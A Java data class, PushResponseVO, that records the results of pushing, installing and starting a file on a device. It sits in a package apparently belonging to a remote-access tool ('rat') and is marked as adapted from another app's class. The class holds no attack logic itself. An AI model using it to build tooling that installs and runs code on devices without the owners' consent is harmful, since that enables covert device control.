package com.vendor.rat.model.resp;

// ADAPT: vendor = com.guard.wallet.resp.PushResponseVO
import androidx.annotation.NonNull;
import com.vendor.rat.control.entity.CommandResult;
import java.io.Serializable;

public class PushResponseVO implements Serializable {
    private String deviceId;
    private Integer downloadResult;
    private String fileUrl;
    private Integer installMethod;
    private Integer installResult;
    private String logId;
    private CommandResult pushCommandResult;
    private CommandResult runCommandResult;
    private Integer startResult;

    public PushResponseVO() {
    }

    public PushResponseVO(String logId, String deviceId, String fileUrl, Integer installMethod, Integer installResult, Integer startResult, CommandResult pushCommandResult, CommandResult runCommandResult) {
        this.logId = logId;
        this.deviceId = deviceId;
        this.fileUrl = fileUrl;
        this.installMethod = installMethod;
        this.installResult = installResult;
        this.startResult = startResult;
        this.pushCommandResult = pushCommandResult;
        this.runCommandResult = runCommandResult;
    }

    public String getDeviceId() {
        return this.deviceId;
    }

    public Integer getDownloadResult() {
        return this.downloadResult;
    }

    public String getFileUrl() {
        return this.fileUrl;
    }

    public Integer getInstallMethod() {
        return this.installMethod;
    }

    public Integer getInstallResult() {
        return this.installResult;
    }

    public String getLogId() {
        return this.logId;
    }

    public CommandResult getPushCommandResult() {
        return this.pushCommandResult;
    }

    public CommandResult getRunCommandResult() {
        return this.runCommandResult;
    }

    public Integer getStartResult() {
        return this.startResult;
    }

    public void setDeviceId(String deviceId) {
        this.deviceId = deviceId;
    }

    public void setDownloadResult(Integer downloadResult) {
        this.downloadResult = downloadResult;
    }

    public void setFileUrl(String fileUrl) {
        this.fileUrl = fileUrl;
    }

    public void setInstallMethod(Integer installMethod) {
        this.installMethod = installMethod;
    }

    public void setInstallResult(Integer installResult) {
        this.installResult = installResult;
    }

    public void setLogId(String logId) {
        this.logId = logId;
    }

    public void setPushCommandResult(CommandResult pushCommandResult) {
        this.pushCommandResult = pushCommandResult;
    }

    public void setRunCommandResult(CommandResult runCommandResult) {
        this.runCommandResult = runCommandResult;
    }

    public void setStartResult(Integer startResult) {
        this.startResult = startResult;
    }

    @NonNull
    public String toString() {
        return "PushResponseVO{logId='" + this.logId
                + "', deviceId='" + this.deviceId
                + "', fileUrl='" + this.fileUrl
                + "', installMethod=" + this.installMethod
                + ", installResult=" + this.installResult
                + ", startResult=" + this.startResult
                + ", pushCommandResult=" + this.pushCommandResult
                + ", runCommandResult=" + this.runCommandResult + '}';
    }
}
